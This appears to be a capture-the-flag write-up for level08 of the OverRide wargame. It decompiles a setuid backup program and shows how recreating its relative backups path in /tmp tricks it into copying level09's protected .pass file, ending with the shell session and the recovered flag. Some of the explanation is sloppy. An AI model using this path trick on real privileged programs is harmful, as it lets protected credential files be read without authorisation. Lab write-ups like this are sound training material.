...
There is 2 function, a main(), and a log_wrapper() function.
...
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ...
  fd = open(dest, 193, 432LL); // open("/etc/passwd",  O_RDONLY | O_WRONLY | O_EXCL | O_CREAT );
  if ( fd < 0 )
  {
...
Lot of things going on, before looking at any buffer to overflow, lets try if we can make that program open the .pass file.

First the the program open the "./backups/.log file and write "Starting back up: " in that file using the log_wrapper() function.

It then open the file specified in argv[1], so it can open /home/users/level09/.pass.

If it succeed, it insert the string "./backups/" + argv[1], notice that it can copy argv[1] up to 88 char (99 * - strlen(dest)).

So for example if i give "/home/users/level09/.pass.", it will be "./backups//home/users/level09/.pass."

If opening "./backups//home/users/level09/.pass." succeed, it then write "/home/users/level09/.pass.", in "./backups//home/users/level09/.pass.".

And the rest is not important.

So its possible to make it read the password and write it to us so lets try that.

```sh
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ ls ./backups/home/users/level09/.pass
./backups/home/users/level09/.pass
level08@OverRide:/tmp$ ls -la ./backups/home/users/level09/.pass
-rw-rw---- 1 level09 users 41 Mar  9 18:22 ./backups/home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:/tmp$
```

As you can see i got to /tmp, and make the exact same path name, so when i will give "/home/users/level09/.pass.", it will write our password to "./backups//home/users/level09/.pass.".

And our flag is cooked good.